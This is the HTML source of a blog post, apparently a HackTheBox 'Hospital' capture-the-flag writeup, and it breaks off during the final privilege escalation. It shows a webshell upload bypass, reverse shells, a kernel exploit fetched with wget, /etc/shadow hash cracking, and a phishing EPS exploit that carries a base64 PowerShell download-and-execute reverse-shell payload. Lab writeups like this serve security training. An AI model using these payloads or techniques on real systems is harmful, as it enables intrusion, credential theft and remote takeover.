@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=4f53bfacf68ebfdbdfd14fd5f74ac2b21965983f">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox Hospital Writeup | Gabriel’s writeups</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="HackTheBox Hospital Writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In this machine, we have a web service vulnerable to webshell upload in which we have to bypass the filters using a .phar file instead of .php and we gain access to another machine in the same network which is linux instead of Windows. Then, we have to use CVE-2023-32629 to exploit a kernel vulnerability and have access as root. Later, we can extract drwilliams password from /etc/shadow hash to gain access to roundcube webmail service. When we have access to that mail service, we have a inbox message of drbrown that saids us to send a .eps file to open with Ghostscript, so we can do phishing to send him a malicious file that exploits CVE-2023-36664. Then, we try to access to the one who owns the xampp https server and we gain access as nt authority/system." />
+<meta property="og:description" content="In this machine, we have a web service vulnerable to webshell upload in which we have to bypass the filters using a .phar file instead of .php and we gain access to another machine in the same network which is linux instead of Windows. Then, we have to use CVE-2023-32629 to exploit a kernel vulnerability and have access as root. Later, we can extract drwilliams password from /etc/shadow hash to gain access to roundcube webmail service. When we have access to that mail service, we have a inbox message of drbrown that saids us to send a .eps file to open with Ghostscript, so we can do phishing to send him a malicious file that exploits CVE-2023-36664. Then, we try to access to the one who owns the xampp https server and we gain access as nt authority/system." />
+<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Hospital.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Hospital.html" />
+<meta property="og:site_name" content="Gabriel’s writeups" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-08T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox Hospital Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-04-08T00:00:00+02:00","datePublished":"2024-04-08T00:00:00+02:00","description":"In this machine, we have a web service vulnerable to webshell upload in which we have to bypass the filters using a .phar file instead of .php and we gain access to another machine in the same network which is linux instead of Windows. Then, we have to use CVE-2023-32629 to exploit a kernel vulnerability and have access as root. Later, we can extract drwilliams password from /etc/shadow hash to gain access to roundcube webmail service. When we have access to that mail service, we have a inbox message of drbrown that saids us to send a .eps file to open with Ghostscript, so we can do phishing to send him a malicious file that exploits CVE-2023-36664. Then, we try to access to the one who owns the xampp https server and we gain access as nt authority/system.","headline":"HackTheBox Hospital Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Hospital.html"},"url":"http://localhost:4000/writeups/2024/HTB/Hospital.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel's writeups</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href = "/writeups">Writeups</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/solutions">Solutions</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/blog">Blog</a>
+    
+    
+</small>
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+
+            <small class="m-2">2024</small>
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HackTheBox Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HackTheBox Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HackTheBox Hospital Writeup</span> <span class="points"> [30 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+    
+      <h2 id="enumeration">
+        
+        
+          Enumeration <a href="#enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+<p>We start with a basic port scanning with nmap:</p>
+
+<pre><code class="language-bash">❯ nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.241
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 21:46 CEST
+Host is up (0.12s latency).
+Not shown: 65508 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE           VERSION
+22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
+|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-04-08 00:59:54Z)
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Issuer: commonName=DC
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-09-06T10:49:03
+| Not valid after:  2028-09-06T10:49:03
+| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
+|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
+|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Issuer: commonName=DC
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-09-06T10:49:03
+| Not valid after:  2028-09-06T10:49:03
+| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+1801/tcp open  msmq?
+2103/tcp open  msrpc             Microsoft Windows RPC
+2105/tcp open  msrpc             Microsoft Windows RPC
+2107/tcp open  msrpc             Microsoft Windows RPC
+2179/tcp open  vmrdp?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Issuer: commonName=DC
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-09-06T10:49:03
+| Not valid after:  2028-09-06T10:49:03
+| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+3269/tcp open  globalcatLDAPssl?
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Issuer: commonName=DC
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-09-06T10:49:03
+| Not valid after:  2028-09-06T10:49:03
+| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+3389/tcp open  ms-wbt-server     Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: HOSPITAL
+|   NetBIOS_Domain_Name: HOSPITAL
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: hospital.htb
+|   DNS_Computer_Name: DC.hospital.htb
+|   DNS_Tree_Name: hospital.htb
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-04-08T01:00:51+00:00
+| ssl-cert: Subject: commonName=DC.hospital.htb
+| Issuer: commonName=DC.hospital.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-04-06T02:29:31
+| Not valid after:  2024-10-06T02:29:31
+| MD5:   4ebb:2d92:c0f4:22fb:50ad:3411:c908:a58c
+|_SHA-1: 3090:c8e0:e245:4e1c:8480:4fc0:f2fa:7a14:2ced:4a38
+5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6404/tcp open  msrpc             Microsoft Windows RPC
+6406/tcp open  msrpc             Microsoft Windows RPC
+6409/tcp open  msrpc             Microsoft Windows RPC
+6631/tcp open  msrpc             Microsoft Windows RPC
+6647/tcp open  msrpc             Microsoft Windows RPC
+8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-open-proxy: Proxy might be redirecting requests
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-title: Login
+|_Requested resource was login.php
+|_http-server-header: Apache/2.4.55 (Ubuntu)
+9389/tcp open  mc-nmf            .NET Message Framing
+Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
+| smb2-time: 
+|   date: 2024-04-08T01:00:53
+|_  start_date: N/A
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+## Nmap done at Sun Apr  7 20:01:34 2024 -- 1 IP address (1 host up) scanned in 131.25 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
+</ul>
+
+<p>We can try to enumerate the active directory services without credentials but we don’t have access.</p>
+
+<p>Let’s try to enumerate the web services: 8080(http), 443(https). We start with the port 443:</p>
+
+<pre><code class="language-bash">❯ whatweb https://10.10.11.241
+https://10.10.11.241 [200 OK] Apache[2.4.56], Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[roundcube_sessid], IP[10.10.11.241], JQuery, OpenSSL[1.1.1t], PHP[8.0.28], PasswordField[_pass], RoundCube, Script, Title[Hospital Webmail :: Welcome to Hospital Webmail], UncommonHeaders[x-robots-tag], X-Frame-Options[sameorigin], X-Powered-By[PHP/8.0.28]
+</code></pre>
+
+<p><img src="/assets/images/Hospital/roundcube.png" alt="Branching" /></p>
+
+<p>It’s a roundcube webmail service which we can’t access because we don’t have credentials.</p>
+
+<p>Now let’s see port 8080:</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.11.241:8080
+http://10.10.11.241:8080 [302 Found] Apache[2.4.55], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.55 (Ubuntu)], IP[10.10.11.241], RedirectLocation[login.php]
+http://10.10.11.241:8080/login.php [200 OK] Apache[2.4.55], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.55 (Ubuntu)], IP[10.10.11.241], JQuery[3.2.1], PasswordField[password], Script, Title[Login]
+</code></pre>
+
+<p>We can see that it works with PHP, it has a login field, and it is a ubuntu server which is a weird thing due to the fact that the machine is supposed to be Windows. Probably, when we gain access to the webserver, we will have access to a container or something similar.</p>
+
+<p>Let’s open the web now in the browser, it looks like this:</p>
+
+<p><img src="/assets/images/Hospital/web_main.png" alt="Branching" /></p>
+    
+      <h2 id="access-as-www-data-to-linux-machine">
+        
+        
+          Access as www-data to linux machine <a href="#access-as-www-data-to-linux-machine" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>Now i will proceed to register a new user and login and we have access to an upload file functionality:</p>
+
+<p><img src="/assets/images/Hospital/upload_func.png" alt="Branching" /></p>
+
+<p>I will start testing this functionality uploading the file that it is supposed to be uploaded named “example.jpeg” and it redirects me to success.php showing me that the file has successfully uploaded:</p>
+
+<p><img src="/assets/images/Hospital/success.png" alt="Branching" /></p>
+
+<p>Now let’s try to discover the folder that contains the uploaded files with wfuzz:</p>
+
+<pre><code class="language-bash">❯ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://10.10.11.241:8080/FUZZ
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.241:8080/FUZZ
+Total requests: 4727
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+=====================================================================
+
+000000025:   403        9 L      28 W       279 Ch      ".htpasswd"                                                                                                            
+000000024:   403        9 L      28 W       279 Ch      ".htaccess"                                                                                                            
+000000023:   403        9 L      28 W       279 Ch      ".hta"                                                                                                                 
+000001334:   301        9 L      28 W       317 Ch      "css"                                                                                                                  
+000001838:   301        9 L      28 W       319 Ch      "fonts"                                                                                                                
+000002202:   302        0 L      0 W        0 Ch        "index.php"                                                                                                            
+000002174:   301        9 L      28 W       320 Ch      "images"                                                                                                               
+000002358:   301        9 L      28 W       316 Ch      "js"                                                                                                                   
+000003723:   403        9 L      28 W       279 Ch      "server-status"                                                                                                        
+000004326:   301        9 L      28 W       321 Ch      "uploads"                                                                                                              
+000004394:   301        9 L      28 W       320 Ch      "vendor"                                                                                                               
+
+Total time: 46.53538
+Processed Requests: 4727
+Filtered Requests: 4716
+Requests/sec.: 101.5786
+</code></pre>
+
+<p>We have an uploads folder so let’s see if we have the same name that we uploaded in that folder:</p>
+
+<p><img src="/assets/images/Hospital/discovered_upload_path.png" alt="Branching" /></p>
+
+<p>So now that we know how the uploaded files are stored on webserver, the next thing i will do is see if we can upload a PHP file, i will test it with Burp Repeater for saving time:</p>
+
+<p><img src="/assets/images/Hospital/failed_upload_php.png" alt="Branching" /></p>
+
+<p>It redirects me to /failed.php so it has not succeeded. If we try some common extension bypasses, we can realize that the .phar extension is allowed:</p>
+
+<p><img src="/assets/images/Hospital/phar_allowed.png" alt="Branching" /></p>
+
+<p>Now i will see phpinfo disable_functions to see if there is some disable_functions that prevents me command execution:</p>
+
+<p><img src="/assets/images/Hospital/disable_functions.png" alt="Branching" /></p>
+
+<p>Searching in google we found <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass">this page</a> in which we can see that we can bypass this with the function fread and popen because they are not disabled in phpinfo. I will test it:</p>
+
+<p><img src="/assets/images/Hospital/uploading_final_phar.png" alt="Branching" /></p>
+
+<p><img src="/assets/images/Hospital/testing_final_phar.png" alt="Branching" /></p>
+
+<p>Now i will proceed to establish a reverse shell connection:</p>
+
+<p><img src="/assets/images/Hospital/establish_shell.png" alt="Branching" /></p>
+
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.124] from (UNKNOWN) [10.10.11.241] 6526
+bash: cannot set terminal process group (981): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@webserver:/var/www/html/uploads$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@webserver:/var/www/html/uploads$ ^Z
+zsh: suspended  nc -lvnp 443
+                                                                                                                                                                                        
+❯ stty raw -echo;fg
+[1]  + continued  nc -lvnp 443
+                    reset xterm
+www-data@webserver:/var/www/html/uploads$ export TERM=xterm
+www-data@webserver:/var/www/html/uploads$ export SHELL=bash
+</code></pre>
+
+<ul>
+  <li><code>script /dev/null -c bash</code>: Spawns a tty</li>
+  <li><code>ctrl+z</code>: puts the shell in background for later doing a treatment</li>
+  <li><code>stty raw -echo;fg</code>: give us the shell back again</li>
+  <li><code>reset xterm</code>: resets the terminal to give us the bash console</li>
+  <li><code>export TERM=xterm</code>: let us do ctrl+l to clean the terminal</li>
+  <li><code>export SHELL=bash</code>: specifies the system that we are using a bash console</li>
+</ul>
+
+<p>However we gained access to another linux machine in the same network but not the host one:</p>
+
+<pre><code class="language-bash">www-data@webserver:/var/www/html/uploads$ ifconfig eth0
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.5.2  netmask 255.255.255.0  broadcast 192.168.5.255
+        inet6 fe80::215:5dff:fe00:8a02  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:15:5d:00:8a:02  txqueuelen 1000  (Ethernet)
+        RX packets 637  bytes 51517 (51.5 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 411  bytes 495806 (495.8 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre>
+    
+      <h2 id="access-as-root-to-linux-server">
+        
+        
+          Access as root to linux server <a href="#access-as-root-to-linux-server" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>The kernel version is vulnerable to <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">CVE-2023-2640 and CVE-2023-32629</a>, so we can exploit it and gain access as root:</p>
+    
+      <h4 id="attacker">
+        
+        
+          Attacker
+        
+        
+      </h4>
+<pre><code class="language-bash">❯ ls -l exploit.sh
+-rw-r--r-- 1 gabri gabri 558 abr  8 18:23 exploit.sh
+                                                                                                                                                                                        
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+    
+      <h4 id="victim">
+        
+        
+          Victim
+        
+        
+      </h4>
+<pre><code class="language-bash">www-data@webserver:/var/www/html/uploads$ cd /tmp/
+www-data@webserver:/tmp$ wget http://10.10.14.124/exploit.sh
+--2024-04-09 22:51:15--  http://10.10.14.124/exploit.sh
+Connecting to 10.10.14.124:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 558 [text/x-sh]
+Saving to: 'exploit.sh'
+
+exploit.sh          100%[===================&gt;]     558  --.-KB/s    in 0s      
+
+2024-04-09 22:51:15 (27.2 MB/s) - 'exploit.sh' saved [558/558]
+
+www-data@webserver:/tmp$ chmod +x exploit.sh 
+www-data@webserver:/tmp$ ./exploit.sh 
+[+] You should be root now
+[+] Type 'exit' to finish and leave the house cleaned
+root@webserver:/tmp## whoami
+root
+</code></pre>
+    
+      <h2 id="access-to-windows-machine-as-drbrown">
+        
+        
+          Access to windows machine as drbrown <a href="#access-to-windows-machine-as-drbrown" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>Now that we have access as root in the linux machine, we can try to crack the hash of /etc/shadow.</p>
+
+<pre><code class="language-bash">root@webserver:/tmp## cat /etc/shadow | grep "drwilliams"
+drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
+</code></pre>
+
+<pre><code class="language-bash">❯ cat drwilliams.hash
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: drwilliams.hash
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+❯ john -w=/usr/share/wordlists/rockyou.txt drwilliams.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+qwe123!@##        (?)     
+1g 0:00:00:15 DONE (2024-04-09 18:02) 0.06285g/s 13516p/s 13516c/s 13516C/s rufus11..pakimo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+
+<p>Now that we have that password, let’s try to reuse it to roundcube webmail service and see if we can see his mails:</p>
+
+<p><img src="/assets/images/Hospital/mail_drbrown_eps.png" alt="Branching" /></p>
+
+<p>We have access and we can see that there is a mail of drbrown that want us to send a .eps file that can be opened with Ghostscript.</p>
+
+<p>Searching in google for ghostscript exploits we end on <a href="https://vsociety.medium.com/cve-2023-36664-command-injection-with-ghostscript-poc-exploit-97c1badce0af">this page</a> that explains how we can create a malicious eps file that executes commands on victim.</p>
+
+<p>I will craft one that retrieves me a shell downloading and executing the content of the <a href="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1">script Invoke-ConPtyShell</a> to gain access to a fully interactive reverse shell in windows.</p>
+
+<blockquote>
+  <p>I recommend to open a new window of the terminal to receive the windows ConPtyShell and specify the rows and columns of that new window for having the best experience.</p>
+</blockquote>
+
+<pre><code class="language-bash">❯ stty size
+44 184
+
+❯ echo "IEX(New-Object Net.WebClient).downloadString(\"http://&lt;Your IP&gt;/Invoke-ConPtyShell.ps1\"); Invoke-ConPtyShell -RemoteIp &lt;Your IP&gt; -RemotePort &lt;Your Port&gt; -Rows &lt;Your rows of terminal&gt; -Cols &lt;Columns of terminal&gt;" | iconv -t utf16le | base64 -w 0
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMgA0AC8ASQBuAHYAbwBrAGUALQBDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBwAHMAMQAiACkAOwAgAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBoAGUAbABsACAALQBSAGUAbQBvAHQAZQBJAHAAIAAxADAALgAxADAALgAxADQALgAxADIANAAgAC0AUgBlAG0AbwB0AGUAUABvAHIAdAAgADQANAAzACAALQBSAG8AdwBzACAANAA0ACAALQBDAG8AbABzACAAMQA4ADQACgA=                                                                                                                                                                                        
+❯ payload="powershell -enc &lt;Your payload of above&gt;"
+                                                                                                                                                                                        
+❯ python3 ghostscript_exploit.py --generate --payload "$payload" --filename project --extension eps
+[+] Generated EPS payload file: project.eps
+</code></pre>
+
+<p>Now spawn a nc listener on the port you specified, a python webserver to interpret the Invoke-ConPtyShell from the victim’s machine, send the file to drbrown and wait for reverse shell:</p>
+
+<p><img src="/assets/images/Hospital/file_sended.png" alt="Branching" /></p>
+
+<p>You have to receive a request to your Invoke-ConPtyShell.ps1 and receive the shell on the nc listener. When you receive the shell, just hit enter, press ctrl+z, put the command <code>stty raw -echo;fg</code>, hit enter and press ctrl+l. In this way we have a fully interactive reverse shell and we can do ctrl+c, we have autocompletion and whatever we want.</p>
+
+<p>Now we can see user.txt:</p>
+
+<pre><code class="language-powershell">PS C:\Users\drbrown.HOSPITAL&gt; cd .\Desktop\
+PS C:\Users\drbrown.HOSPITAL\Desktop&gt; type .\user.txt
+e2****************************51
+</code></pre>
+    
+      <h2 id="privilege-escalation-on-windows-machine">
+        
+        
+          Privilege escalation on windows machine <a href="#privilege-escalation-on-windows-machine" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>This privilege escalation is very simple and easy. We just have to place a php reverse shell on the roundcube webmail service because the one who is running the https service is Administrator. There is no way to come to that conclusion, we just have to try it to see from which user we receive the shell.</p>
+
+<pre><code class="language-powershell">PS C:\Users\drbrown.HOSPITAL\Documents&gt; cd C:\xampp\htdocs\    
